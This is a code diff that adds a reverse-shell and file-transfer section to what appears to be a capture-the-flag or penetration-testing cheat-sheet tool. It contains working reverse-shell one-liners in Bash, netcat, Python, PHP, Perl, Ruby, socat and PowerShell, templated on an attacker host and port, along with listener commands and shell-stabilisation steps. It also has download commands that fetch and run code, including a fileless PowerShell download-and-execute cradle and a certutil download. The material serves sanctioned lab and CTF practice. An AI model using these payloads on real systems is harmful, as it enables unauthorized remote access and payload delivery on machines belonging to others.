@@ -350,5 +350,79 @@ const CTF_DATA = [
         ]
       }
     ]
+  },
+
+  /* ========================================================
+     REVERSE SHELLS & FILE TRANSFER
+     ======================================================== */
+  {
+    id: "shells",
+    title: "Reverse Shells & File Transfer",
+    emoji: "🐚",
+    desc: "Generate a reverse shell for any language, stabilise it into a proper TTY, then move files on and off the box.",
+    groups: [
+      {
+        id: "revgen",
+        title: "Reverse Shell Generator",
+        type: "revshell",
+        note: "Set LHOST / LPORT once — every payload below updates live. Start the matching listener first."
+      },
+      {
+        id: "stab",
+        title: "Shell Stabilisation",
+        note: "Turn a dumb shell into a full interactive TTY so Ctrl-C, arrows, tab-completion and su/ssh work.",
+        items: [
+          { cmd: "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'", desc: "Step 1 — upgrade to a PTY-backed bash (try python/python3/script).", tags: ["shell", "pty", "stabilise", "tty"] },
+          { cmd: "script -qc /bin/bash /dev/null", desc: "Alternative PTY upgrade when python is absent.", tags: ["shell", "script", "pty"] },
+          { cmd: "export TERM=xterm; export SHELL=/bin/bash", desc: "Step 2 — set TERM so clear/less/vim render correctly.", tags: ["shell", "term", "env"] },
+          { cmd: "# Ctrl-Z  then:  stty raw -echo; fg  then:  (press enter twice)", desc: "Step 3 — background, hand the local terminal raw to the remote shell, foreground.", tags: ["shell", "stty", "raw", "echo"] },
+          { cmd: "stty -a   # note local rows/cols, then on target: stty rows R cols C", desc: "Step 4 — match the terminal size so full-screen apps don't wrap.", tags: ["shell", "stty", "rows", "cols"] }
+        ]
+      },
+      {
+        id: "transfer",
+        title: "File Transfer",
+        note: "Serve a file from the attacker, pull it from the target. Pick a method the box actually has.",
+        items: [
+          { cmd: "python3 -m http.server 80            # attacker: serve current dir", desc: "Start a quick HTTP server to host payloads/tools.", tags: ["transfer", "http", "python", "serve"] },
+          { cmd: "wget http://LHOST/file -O /tmp/file   /   curl http://LHOST/file -o /tmp/file", desc: "Linux target pulls over HTTP.", tags: ["transfer", "wget", "curl", "linux"] },
+          { cmd: "certutil -urlcache -split -f http://LHOST/file.exe C:\\Windows\\Temp\\file.exe", desc: "Windows download via the built-in certutil LOLBIN.", tags: ["transfer", "certutil", "windows", "lolbas"] },
+          { cmd: "powershell -c \"IWR http://LHOST/file.exe -OutFile C:\\Windows\\Temp\\file.exe\"", desc: "PowerShell Invoke-WebRequest download cradle.", tags: ["transfer", "powershell", "iwr", "windows"] },
+          { cmd: "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://LHOST/s.ps1')\"", desc: "Fileless PowerShell download-and-execute in memory.", tags: ["transfer", "powershell", "fileless", "iex"] },
+          { cmd: "nc -lvnp 443 > out.file      # attacker    |    nc LHOST 443 < file   # target", desc: "Raw netcat file transfer when HTTP is blocked.", tags: ["transfer", "nc", "netcat"] },
+          { cmd: "scp file user@RHOST:/tmp/   /   scp user@RHOST:/path/file .", desc: "SCP transfer when you have SSH credentials.", tags: ["transfer", "scp", "ssh"] },
+          { cmd: "base64 -w0 file   # then on target:  echo BASE64 | base64 -d > file", desc: "Base64 chunking — paste a binary through a shell with no network transfer.", tags: ["transfer", "base64", "paste", "chunk"] },
+          { cmd: "impacket-smbserver share . -smb2support   # attacker    |    copy \\\\LHOST\\share\\f.exe .  # target", desc: "SMB share for fast Windows transfers (supports copy both ways).", tags: ["transfer", "smb", "impacket", "windows"] }
+        ]
+      }
+    ]
   }
+];
+
+/* ============================================================
+   Reverse shell payload templates
+   {{LHOST}} / {{LPORT}} are substituted by the generator.
+   ============================================================ */
+const REVSHELLS = [
+  { name: "Bash -i",        cmd: "bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1" },
+  { name: "Bash (196)",     cmd: "0<&196;exec 196<>/dev/tcp/{{LHOST}}/{{LPORT}}; sh <&196 >&196 2>&196" },
+  { name: "Bash (base64)",  cmd: "echo 'bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1' | base64" },
+  { name: "nc (mkfifo)",    cmd: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {{LHOST}} {{LPORT}} >/tmp/f" },
+  { name: "nc -e",          cmd: "nc -e /bin/sh {{LHOST}} {{LPORT}}" },
+  { name: "ncat",           cmd: "ncat {{LHOST}} {{LPORT}} -e /bin/bash" },
+  { name: "Python3",        cmd: "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{{LHOST}}\",{{LPORT}}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/bash\")'" },
+  { name: "PHP",            cmd: "php -r '$sock=fsockopen(\"{{LHOST}}\",{{LPORT}});exec(\"/bin/sh -i <&3 >&3 2>&3\");'" },
+  { name: "Perl",           cmd: "perl -e 'use Socket;$i=\"{{LHOST}}\";$p={{LPORT}};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" },
+  { name: "Ruby",           cmd: "ruby -rsocket -e'f=TCPSocket.open(\"{{LHOST}}\",{{LPORT}}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'" },
+  { name: "socat",          cmd: "socat TCP:{{LHOST}}:{{LPORT}} EXEC:'bash -li',pty,stderr,setsid,sigint,sane" },
+  { name: "PowerShell",     cmd: "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{{LHOST}}',{{LPORT}});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sby=([Text.Encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()};$c.Close()\"" },
+  { name: "Netcat Windows", cmd: "nc.exe {{LHOST}} {{LPORT}} -e cmd.exe" }
+];
+
+/* Matching listeners for the shell you choose. */
+const LISTENERS = [
+  { name: "netcat",               cmd: "nc -lvnp {{LPORT}}" },
+  { name: "ncat (TLS)",           cmd: "ncat --ssl -lvnp {{LPORT}}" },
+  { name: "rlwrap + nc (arrows)", cmd: "rlwrap nc -lvnp {{LPORT}}" },
+  { name: "socat (full TTY)",     cmd: "socat file:`tty`,raw,echo=0 TCP-L:{{LPORT}}" }
 ];
